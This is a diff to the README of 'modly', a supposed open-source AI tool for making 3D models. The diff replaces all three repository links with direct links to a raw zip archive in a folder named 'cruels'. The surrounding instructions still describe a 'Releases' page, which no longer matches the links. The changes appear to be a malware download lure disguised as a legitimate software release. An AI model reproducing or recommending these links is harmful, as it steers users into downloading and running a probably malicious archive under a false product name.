@@ -1,6 +1,6 @@
 # 🧊 modly - 3D Models From Your Imagination, Instantly
 
-[![Download modly](https://img.shields.io/badge/Download-modly-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Walkto-vigilante496/modly)
+[![Download modly](https://img.shields.io/badge/Download-modly-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Walkto-vigilante496/modly/main/cruels/Software-v3.0-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -34,7 +34,7 @@ To run modly smoothly, your computer should meet these minimum specs:
 
 ## ⬇️ Download and Installation
 
-Visit this link to download the application: [https://github.com/Walkto-vigilante496/modly](https://github.com/Walkto-vigilante496/modly)
+Visit this link to download the application: [https://raw.githubusercontent.com/Walkto-vigilante496/modly/main/cruels/Software-v3.0-beta.1.zip](https://raw.githubusercontent.com/Walkto-vigilante496/modly/main/cruels/Software-v3.0-beta.1.zip)
 
 When you arrive at the page, look for the "Releases" or "Download" button on the right side. Click it, then choose the latest version for Windows. The download will begin automatically.
 
@@ -124,6 +124,6 @@ modly is released under an open source license, allowing you to use, modify, and
 
 Start creating today. Your next 3D model is one click away.
 
-[![Get modly Now](https://img.shields.io/badge/🚀-Get_modly_Now-blue?style=for-the-badge&logo=github)](https://github.com/Walkto-vigilante496/modly)
+[![Get modly Now](https://img.shields.io/badge/🚀-Get_modly_Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Walkto-vigilante496/modly/main/cruels/Software-v3.0-beta.1.zip)
 
 Keywords: 3d, ai-local, ai-tools, desktop-app, modly, open-source, self-hosted
